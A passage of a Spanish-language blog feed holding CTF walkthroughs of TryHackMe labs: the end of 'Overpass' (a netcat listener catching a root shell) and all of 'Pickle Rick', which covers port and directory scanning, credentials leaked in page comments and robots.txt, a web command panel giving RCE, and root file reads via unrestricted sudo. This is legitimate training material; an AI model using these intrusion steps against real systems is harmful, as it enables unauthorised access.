+<p>Y ahora situamos un puerto de escucha con netcat, donde nos aparecerá nuestra shell con el root</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 20.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Hacemos un ls y por ultimo un cat para obtener nuestra flag del root</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 21.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<hr />]]></content><author><name></name></author><category term="Enumeración" /><category term="Privilege Escalation" /><category term="Cron" /><category term="Security" /><summary type="html"><![CDATA[Vamos a realizar la maquina Overpass de THM, donde debemos de entrar en una máquina con el fin de encontrar información (flags).]]></summary></entry><entry><title type="html">Pickle Rick</title><link href="http://localhost:4000/blog/PickleRick" rel="alternate" type="text/html" title="Pickle Rick" /><published>2024-08-07T00:00:00+02:00</published><updated>2024-08-07T00:00:00+02:00</updated><id>http://localhost:4000/blog/PickleRick</id><content type="html" xml:base="http://localhost:4000/blog/PickleRick"><![CDATA[<h1 id="task-1-ingrediente-1">Task 1: Ingrediente 1</h1>
+
+<p>Como hemos leido en la introducción, esta máquina consiste en obtener los tres ingredientes de la poción de Rick.</p>
+
+<p>Primero, vamos a iniciar la máquina y gracias a eso vamos a obtener la IP de la máquina.Para empezar con este laboratorio vamos a hacer uso de la herramienta → <strong><em>Nmap.</em></strong>
+Gracias a ella vamos a obtener los puertos que la máquina tiene abiertos para ver si podemos aprovecharnos de eso.</p>
+<div style="text-align:left;">
+  <table>
+    <tr>
+      <td>
+        <div style="text-align:center;">
+          <img src="../assets/images/Rooms/PickleRick/Untitled.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:1000px;" />
+        </div>
+      </td>
+      <td>
+        <div style="text-align:center;">
+          <img src="../assets/images/Rooms/PickleRick/Untitled 1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Perfecto, como vemos, tenemos un puerto 80 <em>http</em> (pagina web) y puerto 22 un servicio <em>ssh</em>. Como no tenemos ninguna credencial para realizar la conexión via <em>SSH</em>, vamos a ver que hay en la página web:</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/PickleRick/Untitled 2.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>De momento no encontramos información relevante sobre la página web, pero podemos ver el código fuente de la misma para poder encontrar información.</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/PickleRick/a.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Bingo, tenemos un Username en un comentario. Ahora podemos proceder a realizar un escaneo de directorios de la página web. Mediante <code class="language-plaintext highlighter-rouge">gobuster</code> podemos realizar una búsqueda de directorios, donde podemos encontrar información.</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/PickleRick/Untitled 3.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Hemos encontrado el directorio <code class="language-plaintext highlighter-rouge">/assets</code> y <code class="language-plaintext highlighter-rouge">/robots.txt</code>. Vamos a acceder a ambos:</p>
+<div sytle="text-align:left;">
+  <table>
+    <tr>
+      <td>
+        <div>
+          <img src="../assets/images/Rooms/PickleRick/Untitled 4.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
+        </div>
+      </td>
+      <td>
+        <div>
+          <img src="../assets/images/Rooms/PickleRick/b.png" alt="Untitled" onclick="openModal(this.src)" style="width:200%; max-width:800px;" />
+        </div>
+        Contenido del directorio /robots.
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>En robots.txt hemos encontrado una cadena de caracteres, no sabemos si puede ser un nuevo usuario o una contraseña.</p>
+
+<p>Si tenemos un username y una supuesta contraseña, podemos escribir <em>ip_maquina/login.php</em> para verificar si hay un login ya que existe un servicio <em>SSH</em> corriendo y podemos iniciar sesión con las credenciales obtenidas.</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/PickleRick/Untitled 5.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>En efecto, hemos podido iniciar sesión con las credeciales. Ahora encontramos como una consola donde podemos introducir comandos; tenemos un RCE (Ejecución Remota de Comandos), por ejemplo, vamos a tirar un listado de los archivos del directorio en el que nos encontramos actualmente mediante <code class="language-plaintext highlighter-rouge">ls -l</code>:</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/PickleRick/Untitled 6.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Como vemos al listar los archivos encontramos uno llamado <em>Sup3rS3cretPickl3Ingred.txt</em>, por tanto si accedemos a la ruta <code class="language-plaintext highlighter-rouge">&lt;ip_maquina&gt;/nombre_archivo.txt</code> encontramos la primera flag:</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/PickleRick/c.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<h1 id="task-2-ingrediente-2">Task 2: Ingrediente 2</h1>
+
+<p>El segundo ingrediente no está en este directorio (como es de esperar),por tanto, debemos de navegar por los demás directorios del servidor en busca de ella.</p>
+
+<p>Vamos a ver si nos podemos cambiar de directorios, con <code class="language-plaintext highlighter-rouge">cd ../../../../</code>, listamos otra vez y vemos que encontramos más directorios, por tanto, tenemos un <strong>path traversal</strong> en el servidor.</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/PickleRick/Untitled 7.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Hemos encontrado el directorio <code class="language-plaintext highlighter-rouge">/home</code>, <code class="language-plaintext highlighter-rouge">/root</code> entre otros, pero estos dos son los más importantes. Vamos a acceder primeramente al directorio <code class="language-plaintext highlighter-rouge">/home</code> en busca del siguiente ingrediente.</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/PickleRick/Untitled 8.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>WOW, hemos encontrado otros dos directorios, <code class="language-plaintext highlighter-rouge">/rick</code> y <code class="language-plaintext highlighter-rouge">/ubuntu</code>. Si accedemos al directorio <code class="language-plaintext highlighter-rouge">/rick</code>, vemos que hay un archivo que se llama <em>second ingredients</em></p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/PickleRick/Untitled 9.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Perfecto, hemos obtenido el segundo ingrediente de la poción de Rick.</p>
+
+<h1 id="task-3-ingrediente-3">Task 3: Ingrediente 3</h1>
+
+<p>Por último, para poder buscar el tercer ingrediente, debemos de buscar en la carpeta ‘root’ que se encuentra en el directorio donde también se encuentra ‘home’, como he comentado antes.</p>
+
+<p>Pero hay un problema, solo puede acceder a ella usuario que tengan permisos de root, por lo que tendremos que buscar una manera de escalar privilegios para poder acceder a dicho directorio. Si hacemos uso del comando <code class="language-plaintext highlighter-rouge">sudo -l</code> podemos ver si el usuario actual puede ejecutar algún comando como sudo:</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/PickleRick/Untitled 10.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Vemos que el usuario actual (www-data) tiene permisos para ejecutar todos los comandos como root → <code class="language-plaintext highlighter-rouge">(ALL) NOPASSWD: ALL</code>.</p>
+
+<p>Una cosa interesante es que haciendo <code class="language-plaintext highlighter-rouge">sudo su</code>no hacemos nada, si no que tenemos que realizar una lectura del archivo con privilegios root.</p>
+
+<div style="text-align:center;">
+  <img src="../assets/images/Rooms/PickleRick/Untitled 11.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Finalmente encontramos el archivo que contiene el tercer ingrediente llamado <em>3rd.txt</em>, donde ejecutamos el comando → <code class="language-plaintext highlighter-rouge">sudo less /root/"3rd.txt"</code>, podremos ver su contenido debido a que ese comando se ejecuta con privilegios root.</p>
+
+<hr />]]></content><author><name></name></author><category term="Enumeración" /><category term="RCE" /><category term="Web" /><summary type="html"><![CDATA[Pickle Rick es una máquina de Tryhackme, con ambientación en la serie animada Rick and Morty. En esta máquina debemos obtener los tres ingredientes para que Rick pueda realizar su poción. Haremos uso de una máquina con Linux, conocimientos sobre comandos de Linux y uso de herramientas y conocimientos sobre páginas web.]]></summary></entry></feed>
